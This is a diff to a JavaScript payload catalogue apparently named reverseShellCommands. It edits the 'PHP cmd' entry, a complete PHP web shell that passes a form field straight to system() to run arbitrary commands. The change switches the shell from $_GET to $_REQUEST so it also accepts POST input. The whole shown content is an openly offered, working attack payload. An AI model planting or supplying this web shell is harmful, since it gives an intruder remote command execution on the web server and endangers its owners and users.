@@ -116,7 +116,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "PHP cmd",
-            "command": "&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER[\'PHP_SELF\']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;\/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?&gt;\n&lt;\/pre&gt;\n&lt;\/body&gt;\n&lt;script&gt;document.getElementById(\"cmd\").focus();&lt;\/script&gt;\n&lt;\/html&gt;",
+            "command": "&lt;html&gt;\n&lt;body&gt;\n&lt;form method=\"GET\" name=\"&lt;?php echo basename($_SERVER[\'PHP_SELF\']); ?&gt;\"&gt;\n&lt;input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"&gt;\n&lt;input type=\"SUBMIT\" value=\"Execute\"&gt;\n&lt;\/form&gt;\n&lt;pre&gt;\n&lt;?php\n    if(isset($_REQUEST[\'cmd\']))\n    {\n        system($_REQUEST[\'cmd\']);\n    }\n?&gt;\n&lt;\/pre&gt;\n&lt;\/body&gt;\n&lt;script&gt;document.getElementById(\"cmd\").focus();&lt;\/script&gt;\n&lt;\/html&gt;",
             "meta": ["linux", "windows", "mac"]
         },
         {
